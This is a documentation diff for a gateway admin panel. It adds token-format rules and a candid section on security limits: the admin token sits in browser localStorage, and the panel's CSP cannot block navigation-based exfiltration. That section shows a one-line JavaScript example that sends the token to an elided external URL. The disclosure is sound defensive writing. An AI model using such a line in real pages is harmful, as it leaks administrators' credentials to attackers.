@@ -140,7 +140,7 @@ number of isolates.
 
 | Variable | Required | Default | Notes |
 |---|---|---|---|
-| `ADMIN_TOKEN` | no | none (panel disabled) | Token for the admin endpoints. **Must differ from `GATEWAY_TOKEN`**, and must be at least 24 characters. It must also have **no leading or trailing whitespace**: HTTP strips whitespace from header values but environment variables keep it, so a padded token can never be sent by any client. Unset or non-compliant ⇒ the whole `/admin` tree is never registered, and the reason is logged as `admin.token_rejected`. |
+| `ADMIN_TOKEN` | no | none (panel disabled) | Token for the admin endpoints. **Must differ from `GATEWAY_TOKEN`**, and must be at least 24 characters. It must also have **no leading or trailing whitespace**: HTTP strips whitespace from header values but environment variables keep it, so a padded token can never be sent by any client. The token must also consist solely of **printable ASCII (0x21–0x7E) with no spaces**: a token containing CJK characters, emoji, zero-width spaces or control characters simply cannot be sent by a browser (`fetch` throws when setting such a header value), so it would build a panel that returns 200 yet can never be entered — and the server would not even get one `admin.login_failed`. A space itself is perfectly sendable; excluding it is a deliberate choice to avoid copy-paste mistakes. Unset or non-compliant ⇒ the whole `/admin` tree is never registered, and the reason is logged as `admin.token_rejected`. |
 | `TRUST_PROXY` | no | unset (**no** forwarded header is trusted) | Set to `1` **only** if the gateway really sits behind a proxy — that includes the Cloudflare Worker form, where you should set it. When set, the client IP recorded in login-failure events comes from `CF-Connecting-IP`, falling back to the first segment of `X-Forwarded-For`. |
 
 **Not set ⇒ the panel is simply unavailable, and the gateway keeps forwarding.** Requests to
@@ -176,13 +176,30 @@ started during it — would be **permanently `404`**, unrecoverable by fixing th
 only curable by a restart, while isolates built before the conflict merely return `503` and
 recover as soon as you change the value back. Same configuration, same instant, two different
 answers — and the "no restart needed" sentence above would be half a lie. The two rules that
-concern `ADMIN_TOKEN` alone (leading/trailing whitespace, minimum length) do not have this
+concern `ADMIN_TOKEN` alone (leading/trailing whitespace, unsendable characters, minimum
+length) do not have this
 problem: their only input is an environment variable that cannot change at runtime, so they are
 still enforced at startup and their failure mode remains `404`.
 
 `ADMIN_TOKEN` is read **from environment variables only, never from storage**: the panel cannot
 rotate its own key. To rotate it, run `npx wrangler secret put ADMIN_TOKEN` and redeploy on the
 Worker, or edit `.env` and recreate the container on Docker.
+
+**Leaking the admin token means leaking `ADMIN_TOKEN` itself.** The panel stores it verbatim in
+the browser's localStorage. There is no derived token and no in-product revocation path. The only
+way to revoke it is to change the secret and redeploy (Worker) or recreate the container (Docker).
+The panel asks for the token again after 12 hours, but that only shortens how long that
+localStorage value stays usable — it is **not** revocation. Put the panel behind TLS and open it
+only on machines you trust.
+
+**What that cap cannot do, stated plainly.** The panel's CSP uses `connect-src 'self'` to stop the
+token from being `fetch`ed to an external domain and `form-action 'none'` to stop form-based
+exfiltration; it cannot stop navigation-based exfiltration such as
+`location.href = "https://…?k=" + token` — CSP no longer has a directive for that
+(`navigate-to` was removed from the spec). The real fix is server-issued **revocable derived
+tokens**, which requires the server to store sessions and therefore conflicts with the design rule
+that `ADMIN_TOKEN` is read from environment variables only, never from storage. Left for a later
+release.
 
 **`TRUST_PROXY` is a security switch, which is why it defaults to off.** The client IP it decides
 ends up in the `admin.login_failed` event, so trusting a client-supplied header blindly would let
